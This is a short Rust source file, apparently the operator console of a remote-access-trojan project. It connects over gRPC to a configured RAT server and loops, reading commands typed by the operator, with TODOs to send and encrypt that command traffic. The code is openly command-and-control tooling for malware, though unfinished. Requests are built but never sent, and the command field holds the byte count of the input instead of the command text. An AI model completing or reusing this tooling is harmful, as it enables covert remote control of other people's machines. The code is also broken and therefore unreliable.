use remote_access_trojan::rat::CommandRequest;
use remote_access_trojan::rat::schedule_command_client::ScheduleCommandClient;
use std::io::{stdin, stdout, Write};
use tonic::transport::Endpoint;

/*
TODO
    - send commands from operator to server
    - encrypt traffic from operator to server
*/

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    println!("operator");
    // Set up connection to server
    let location = rco_config::RAT_SERVER_LOCATION;
    let port = rco_config::RAT_SERVER_PORT;
    let socket = format!("http://{location}:{port}");
    let channel = Endpoint::from_shared(socket.clone())?
                    .connect()
                    .await?;
    // Prepare a client for beaconing
    let mut ask_client = ScheduleCommandClient::new(channel.clone());
    loop {
        print!("Command > ");
        stdout().flush().unwrap();
        let mut line = String::new();
        let input = stdin().read_line(&mut line).unwrap();
        println!("You said {line}");
        let result = tonic::Request::new(
            CommandRequest {
                command: input as i32,
                arguments: "".to_string()
            },
        );
    }

    Ok(())
}